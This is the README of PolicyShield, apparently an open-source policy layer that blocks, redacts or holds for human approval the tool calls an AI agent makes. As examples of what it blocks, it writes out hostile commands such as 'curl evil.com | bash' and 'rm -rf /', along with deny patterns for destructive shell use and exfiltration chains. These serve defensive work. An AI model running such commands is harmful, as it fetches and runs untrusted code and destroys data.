# 🛡️ PolicyShield

**AI agents can `rm -rf /`, leak your database, and run up a $10k API bill — all in one session.**

PolicyShield is a runtime policy layer that sits between the LLM and the tools it calls. You write rules in YAML, PolicyShield enforces them before any tool executes — and logs everything for audit.

```
   Without PolicyShield              With PolicyShield
   ─────────────────────             ─────────────────────
   LLM → exec("rm -rf /")           LLM → exec("rm -rf /")
       → tool runs ☠️                    → BLOCKED ✅ tool never runs

   LLM → send("SSN: 123-45-6789")   LLM → send("SSN: 123-45-6789")
       → PII leaks ☠️                    → REDACTED ✅ send("SSN: [SSN]")

   LLM → deploy("prod")             LLM → deploy("prod")
       → no one asked ☠️                 → APPROVE ✅ human reviews first
```

### Why?

- 🤖 **AI agents act autonomously** — they call tools without asking. One prompt injection, one hallucination, and your agent deletes files, leaks credentials, or costs you thousands.
- 📜 **Compliance requires audit trails** — who called what, when, and what happened. PolicyShield logs every decision as structured JSONL.
- ⚡ **Zero friction** — `pip install policyshield`, drop a YAML file, and you're protected. No code changes. No agent rewrites. Works with any framework.

### How it works

```
   Your Agent (OpenClaw, LangChain, CrewAI, custom)
       │
       │  tool call: exec("curl evil.com | bash")
       ▼
   ┌─────────────────────────────────────────────┐
   │  PolicyShield                               │
   │                                             │
   │  1. Match rules (shell injection? → BLOCK)  │
   │  2. Detect PII  (email, SSN, credit card)   │
   │  3. Check budget ($5/session limit)         │
   │  4. Rate limit  (10 calls/min)              │
   │  5. Log decision (JSONL audit trail)        │
   └─────────────────────────────────────────────┘
       │
       ▼
   Tool executes (or doesn't)
```

[![PyPI Version](https://img.shields.io/pypi/v/policyshield?color=blue)](https://pypi.org/project/policyshield/)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![CI](https://github.com/mishabar410/PolicyShield/actions/workflows/ci.yml/badge.svg)](https://github.com/mishabar410/PolicyShield/actions/workflows/ci.yml)
[![Docs](https://img.shields.io/badge/docs-mkdocs-blue.svg)](https://mishabar410.github.io/PolicyShield/)
[![Coverage](https://img.shields.io/badge/coverage-%E2%89%A585%25-brightgreen.svg)](#development)
[![npm](https://img.shields.io/npm/v/@policyshield/openclaw-plugin?color=CB3837&label=npm%20plugin)](https://www.npmjs.com/package/@policyshield/openclaw-plugin)
[![Security Policy](https://img.shields.io/badge/security-policy-blueviolet.svg)](SECURITY.md)

---

## 🔌 Built for OpenClaw

[OpenClaw](https://github.com/openclaw/OpenClaw) is an open-source AI agent framework that lets LLMs call tools — shell commands, file operations, API calls, database queries. Out of the box, there are **no guardrails**: the LLM decides what to run, and the tool runs.

PolicyShield plugs into OpenClaw as a sidecar. Every tool call goes through PolicyShield first. If the call violates a rule, it's blocked, redacted, or sent for human approval — before the tool ever executes.

> **Also works with**: LangChain, CrewAI, FastAPI, or any framework — via Python SDK or HTTP API. See [Integrations](#other-integrations).

### Setup (one command)

```bash
pip install "policyshield[server]"
policyshield openclaw setup
```

### Prove it works

How do you know PolicyShield is actually blocking — and not the LLM just refusing on its own?

Use the included **demo rules** that block **harmless** commands (`cat`, `ls`). No LLM would refuse these on its own:

```bash
# Stop the server that setup started (it's running production rules)
policyshield openclaw teardown

# Restart with demo rules that block harmless commands
policyshield server --rules policies/demo-verify.yaml --port 8100
```

Now ask the agent to do something totally harmless:

```bash
# Requires OPENAI_API_KEY (or any provider key configured in OpenClaw)
openclaw agent --local --session-id test \
  -m "Show me the contents of /etc/hosts using cat"
```

**Response:**

> "I can't run the `cat` command due to **policy restrictions**."

🎉 That's PolicyShield — no LLM would refuse `cat /etc/hosts` by itself.

**No API key?** Verify the server directly:

```bash
# → "verdict": "BLOCK" (cat is blocked by demo rules)
curl -s -X POST http://localhost:8100/api/v1/check \
  -H "Content-Type: application/json" \
  -d '{"tool_name": "exec", "args": {"command": "cat /etc/hosts"}}' \
  | python3 -m json.tool

# → "verdict": "ALLOW" (pwd is not in the demo rules)
curl -s -X POST http://localhost:8100/api/v1/check \
  -H "Content-Type: application/json" \
  -d '{"tool_name": "exec", "args": {"command": "pwd"}}' \
  | python3 -m json.tool
```

### Switch to production rules

Once verified, stop the demo server (`Ctrl+C`) and switch to the real security rules (11 rules — blocks `rm -rf`, `curl | sh`, redacts PII, requires approval for `.env` writes):

```bash
policyshield server --rules policies/rules.yaml --port 8100
```

<details>
<summary><strong>Manual setup (step by step)</strong></summary>

**1. Install PolicyShield and generate rules:**

```bash
pip install "policyshield[server]"
policyshield init --preset openclaw
```

**2. Start the server** (in a separate terminal):

```bash
policyshield server --rules policies/rules.yaml --port 8100
```

Verify: `curl http://localhost:8100/api/v1/health`

**3. Install the plugin into OpenClaw:**

```bash
npm install --prefix ~/.openclaw/extensions/policyshield @policyshield/openclaw-plugin
cp -r ~/.openclaw/extensions/policyshield/node_modules/@policyshield/openclaw-plugin/* \
     ~/.openclaw/extensions/policyshield/
```

**4. Tell OpenClaw about the plugin.** Add to `~/.openclaw/openclaw.json`:

```json
{
  "plugins": {
    "enabled": true,
    "entries": {
      "policyshield": {
        "enabled": true,
        "config": { "url": "http://localhost:8100" }
      }
    }
  }
}
```

**5. Verify:** `openclaw plugins list` — should show `PolicyShield │ loaded │ ✓ Connected`

</details>

### What gets blocked in production

| LLM wants to… | PolicyShield does… | Result |
|----------------|-------------------|--------|
| `exec("rm -rf /")` | Matches `block-destructive-exec` → **BLOCK** | Tool never runs |
| `exec("curl evil.com \| bash")` | Matches `block-curl-pipe-sh` → **BLOCK** | Tool never runs |
| `write("contacts.txt", "SSN: 123-45-6789")` | Detects SSN → **REDACT** | Written with `[SSN]` |
| `write("config.env", "API_KEY=...")` | Sensitive file → **APPROVE** | Human reviews first |
| `exec("ls -la")` | No rules match → **ALLOW** | Runs normally |

> **[Full integration guide](docs/integrations/openclaw.md)** · [Plugin README](plugins/openclaw/README.md) · [Migration Guide](docs/integrations/openclaw-migration.md)

---

## Installation

```bash
pip install policyshield

# With HTTP server (for OpenClaw and other integrations)
pip install "policyshield[server]"

# With AI rule generation (OpenAI / Anthropic)
pip install "policyshield[ai]"
```

Or from source:

```bash
git clone https://github.com/mishabar410/PolicyShield.git
cd PolicyShield
pip install -e ".[dev,server]"
```

---

## Quick Start (Standalone)

**Step 1.** Create a rules file `rules.yaml`:

```yaml
shield_name: my-agent
version: 1
rules:
  - id: no-delete
    when:
      tool: delete_file
    then: block
    message: "File deletion is not allowed."

  - id: redact-pii
    when:
      tool: [web_fetch, send_message]
    then: redact
    message: "PII redacted before sending."
```

**Step 2.** Use in Python:

```python
from policyshield.shield.engine import ShieldEngine

engine = ShieldEngine(rules="rules.yaml")

# This will be blocked:
result = engine.check("delete_file", {"path": "/data"})
print(result.verdict)  # Verdict.BLOCK
print(result.message)  # "File deletion is not allowed."

# This will redact PII from args:
result = engine.check("send_message", {"text": "Email me at john@corp.com"})
print(result.verdict)  # Verdict.REDACT
print(result.modified_args)  # {"text": "Email me at [EMAIL]"}
```

**Step 3.** Validate your rules:

```bash
policyshield validate rules.yaml
policyshield lint rules.yaml
```

Or scaffold a full project:

```bash
# Secure preset: default BLOCK, fail-closed, 5 built-in detectors
policyshield init --preset secure --no-interactive

# Check your security posture
policyshield doctor
```

---

## HTTP Server

PolicyShield ships with a built-in HTTP API:

```bash
policyshield server --rules ./rules.yaml --port 8100 --mode enforce
```

### Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/v1/check` | POST | Pre-call policy check (ALLOW/BLOCK/REDACT/APPROVE) |
| `/api/v1/post-check` | POST | Post-call PII scanning on tool output |
| `/api/v1/check-approval` | POST | Poll approval status by `approval_id` |
| `/api/v1/respond-approval` | POST | Approve or deny a pending request |
| `/api/v1/pending-approvals` | GET | List all pending approval requests |
| `/api/v1/health` | GET | Health check with rules count and mode |
| `/api/v1/status` | GET | Server status (running, killed, mode, version) |
| `/api/v1/constraints` | GET | Human-readable policy summary for LLM context |
| `/api/v1/reload` | POST | Hot-reload rules from disk |
| `/api/v1/kill` | POST | Emergency kill switch — block ALL tool calls |
| `/api/v1/resume` | POST | Deactivate kill switch — resume normal operation |

### Docker

```bash
docker build -f Dockerfile.server -t policyshield-server .
docker run -p 8100:8100 -v ./rules.yaml:/app/rules.yaml policyshield-server
```

---

## Rules DSL

```yaml
rules:
  # Block by tool name
  - id: no-destructive-shell
    when:
      tool: exec
      args_match:
        command: { regex: "rm\\s+-rf|mkfs|dd\\s+if=" }
    then: block
    severity: critical

  # Block multiple tools at once
  - id: no-external-pii
    when:
      tool: [web_fetch, web_search, send_email]
    then: redact

  # Human approval required
  - id: approve-file-delete
    when:
      tool: delete_file
    then: approve
    approval_strategy: per_rule

  # Session-based conditions
  - id: rate-limit-exec
    when:
      tool: exec
      session:
        tool_count.exec: { gt: 60 }
    then: block
    message: "exec rate limit exceeded"

  # Chain rule: detect data exfiltration
  - id: anti-exfiltration
    when:
      tool: send_email
      chain:
        - tool: read_database
          within_seconds: 120
    then: block
    severity: critical
    message: "Potential data exfiltration: read_database → send_email"

# Rate limiting
rate_limits:
  - tool: web_fetch
    max_calls: 10
    window_seconds: 60
    per_session: true

# Custom PII patterns
pii_patterns:
  - name: EMPLOYEE_ID
    pattern: "EMP-\\d{6}"
```

**Built-in PII detection:** EMAIL, PHONE, CREDIT_CARD, SSN, IBAN, IP, PASSPORT, DOB + custom patterns.

---

## Features

### Core

| Category | What you get |
|----------|-------------|
| **YAML DSL** | Declarative rules with regex, glob, exact match, session conditions |
| **Verdicts** | `ALLOW` · `BLOCK` · `REDACT` · `APPROVE` (human-in-the-loop) |
| **PII Detection** | EMAIL, PHONE, CREDIT_CARD, SSN, IBAN, IP, PASSPORT, DOB + custom patterns |
| **Built-in Detectors** | Path traversal, shell injection, SQL injection, SSRF, URL schemes — zero-config |
| **Kill Switch** | `policyshield kill` / `POST /api/v1/kill` — block ALL calls instantly |
| **Chain Rules** | Temporal conditions (`when.chain`) — detect multi-step attack patterns |
| **Rate Limiting** | Per-tool, per-session, global, and adaptive (burst detection) rate limiting |
| **Approval Flow** | InMemory and Telegram backends with circuit breaker and health checks |
| **Hot Reload** | File-watcher auto-reloads rules on change |
| **Trace & Audit** | JSONL log, search, stats, violations, CSV/HTML export, rotation & retention |

### Server & Integrations

| Category | What you get |
|----------|-------------|
| **HTTP Server** | FastAPI server with TLS, API rate limiting, and 11 REST endpoints |
| **OpenClaw Plugin** | Native plugin with before/after hooks and policy injection |
| **Async Engine** | Full `async`/`await` support for FastAPI, aiohttp, async agents |
| **Input Sanitizer** | Normalize args, block prompt injection patterns |
| **Output Policy** | Post-call response scanning with block patterns and size limits |
| **Honeypot Tools** | Decoy tools that trigger on prompt injection — always block, even in AUDIT mode |
| **Docker** | Container-ready with Dockerfile.server and docker-compose |

### Developer Experience

| Category | What you get |
|----------|-------------|
| **Doctor** | `policyshield doctor` — 10-check health scan with A-F security grading |
| **Auto-Rules** | `policyshield generate-rules --from-openclaw` — zero-config rule generation |
| **Rule Testing** | YAML test cases for policies (`policyshield test`) |
| **Rule Linter** | Static analysis: 7 checks + multi-file validation + dead rule detection |
| **Replay & Simulation** | Re-run JSONL traces against new rules (`policyshield replay`) |

<details>
<summary><strong>Advanced features</strong> (shadow mode, canary, dashboards, OTel, etc.)</summary>

| Category | What you get |
|----------|-------------|
| **Rule Composition** | `include:` / `extends:` for rule inheritance and modularity |
| **Plugin System** | Extensible detector API — register custom detectors without forking |
| **Budget Caps** | USD-based per-session and per-hour cost limits |
| **Shadow Mode** | Test new rules in production (dual-path evaluation, no blocking) |
| **Canary Deployments** | Roll out rules to N% of sessions, auto-promote after duration |
| **Dynamic Rules** | Fetch rules from HTTP/HTTPS with periodic refresh |
| **OpenTelemetry** | OTLP export to Jaeger/Grafana (spans + metrics) |
| **AI Rule Writer** | Generate YAML rules from natural language (`policyshield generate`) |
| **Cost Estimator** | Token/dollar cost estimation per tool call and model |
| **Alert Engine** | 5 condition types with Console, Webhook, Slack, Telegram backends |
| **Dashboard** | FastAPI REST API + WebSocket live stream + dark-themed SPA |
| **Prometheus** | `/metrics` endpoint with per-tool, PII, and approval labels + Grafana preset |
| **Compliance Reports** | HTML reports: verdicts, violations, PII stats, rule coverage |
| **Incident Timeline** | Chronological session timeline for post-mortems |
| **Config Migration** | `policyshield migrate` — auto-migrate YAML between versions |

</details>

---

## Other Integrations

### LangChain

```python
from policyshield.integrations.langchain import PolicyShieldTool, shield_all_tools

safe_tool = PolicyShieldTool(wrapped_tool=my_tool, engine=engine)
safe_tools = shield_all_tools([tool1, tool2], engine)
```

### CrewAI

```python
from policyshield.integrations.crewai import shield_crewai_tools

safe_tools = shield_crewai_tools([tool1, tool2], engine)
```

---

## CLI

```bash
policyshield validate ./policies/          # Validate rules
policyshield lint ./policies/rules.yaml    # Static analysis (7 checks)
policyshield test ./policies/              # Run YAML test cases

policyshield server --rules ./rules.yaml   # Start HTTP server
policyshield server --rules ./rules.yaml --port 8100 --mode audit
policyshield server --rules ./rules.yaml --tls-cert cert.pem --tls-key key.pem

policyshield trace show ./traces/trace.jsonl
policyshield trace violations ./traces/trace.jsonl
policyshield trace stats --dir ./traces/ --format json
policyshield trace search --tool exec --verdict BLOCK
policyshield trace cost --dir ./traces/ --model gpt-4o
policyshield trace export ./traces/trace.jsonl -f html

# Launch the live web dashboard
policyshield trace dashboard --port 8000 --prometheus

# Replay traces against new rules
policyshield replay ./traces/trace.jsonl --rules ./new-rules.yaml --changed-only

# Simulate a rule without traces
policyshield simulate --rule new_rule.yaml --tool exec --args '{"cmd":"ls"}'

# Generate rules from templates (offline)
policyshield generate --template --tools delete_file send_email -o rules.yaml

# Generate rules with AI (requires OPENAI_API_KEY)
policyshield generate "Block all file deletions and require approval for deploys"

# Auto-generate rules from OpenClaw or tool list
policyshield generate-rules --from-openclaw --url http://localhost:3000
policyshield generate-rules --tools exec,write_file,delete_file -o policies/rules.yaml

# Compliance report for auditors
policyshield report --traces ./traces/ --format html

# Incident timeline for post-mortems
policyshield incident session_abc123 --format html

# Config migration between versions
policyshield migrate --from 0.11 --to 1.0 rules.yaml

# Kill switch — emergency stop
policyshield kill --port 8100 --reason "Incident response"
policyshield resume --port 8100

# Health check
policyshield doctor --config policyshield.yaml --rules rules.yaml
policyshield doctor --json

# Initialize a new project
policyshield init --preset secure --no-interactive
```

---

## Docker

```bash
# Run the HTTP server
docker build -f Dockerfile.server -t policyshield-server .
docker run -p 8100:8100 -v ./rules:/app/rules policyshield-server

# Validate rules
docker compose run policyshield validate policies/

# Lint rules
docker compose run lint

# Run tests
docker compose run test
```

---

## Examples

| Example | Description |
|---------|-------------|
| [`langchain_demo.py`](examples/langchain_demo.py) | LangChain tool wrapping |
| [`async_demo.py`](examples/async_demo.py) | Async engine usage |
| [`openclaw_rules.yaml`](examples/openclaw_rules.yaml) | OpenClaw preset rules (11 rules) |
| [`chain_rules.yaml`](examples/chain_rules.yaml) | Chain rule examples (anti-exfiltration, retry storm) |
| [`policies/`](examples/policies/) | Production-ready rule sets (security, compliance, full) |

### Community Rule Packs

| Pack | Rules | Focus |
|------|-------|-------|
| [`gdpr.yaml`](community-rules/gdpr.yaml) | 8 | EU data protection, cross-border transfers |
| [`hipaa.yaml`](community-rules/hipaa.yaml) | 9 | PHI protection, patient record safety |
| [`pci-dss.yaml`](community-rules/pci-dss.yaml) | 9 | Cardholder data, payment gateway enforcement |

> **How does PolicyShield compare to alternatives?** See the [Comparison page](docs/comparison.md).

---

## Benchmarks

Measured on commodity hardware (Apple M-series, Python 3.13). [Target: <5ms sync, <10ms async.](PHILOSOPHY.md)

| Operation | p50 | p99 | Target |
|-----------|-----|-----|--------|
| Sync check (ALLOW) | 0.01ms | 0.01ms | <5ms ✅ |
| Sync check (BLOCK) | 0.01ms | 0.01ms | <5ms ✅ |
| Async check | 0.05ms | 0.10ms | <10ms ✅ |

Run benchmarks yourself:

```bash
pytest tests/test_benchmark.py -m benchmark -v -s
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| `Connection refused` on plugin install | Start PolicyShield server first: `policyshield server --rules rules.yaml` |
| Server starts but plugin gets timeouts | Check port matches — default is `8100`. Configure in OpenClaw: `openclaw config set plugins.policyshield.url http://localhost:8100` |
| Rules not reloading after edit | Hot-reload watches the file passed to `--rules`. Or call `POST /api/v1/reload` manually |
| `policyshield: command not found` | Install with server extra: `pip install "policyshield[server]"` |
| PII not detected in non-English text | Current PII detector is regex-based (L0). RU patterns (INN, SNILS, passport) are supported. NER-based L1 detection is on the roadmap |

For OpenClaw-specific issues, see the [full integration guide](docs/integrations/openclaw.md).
For upgrading between versions, see the [Compatibility & Migration Guide](docs/integrations/openclaw-migration.md).

---

## Development

```bash
git clone https://github.com/mishabar410/PolicyShield.git
cd PolicyShield
python -m venv .venv && source .venv/bin/activate
pip install -e ".[dev,server]"

pytest tests/ -v                 # 1192+ tests
ruff check policyshield/ tests/  # Lint
ruff format --check policyshield/ tests/  # Format check
```

📖 **Documentation**: [mishabar410.github.io/PolicyShield](https://mishabar410.github.io/PolicyShield/)

---

## License

[MIT](LICENSE)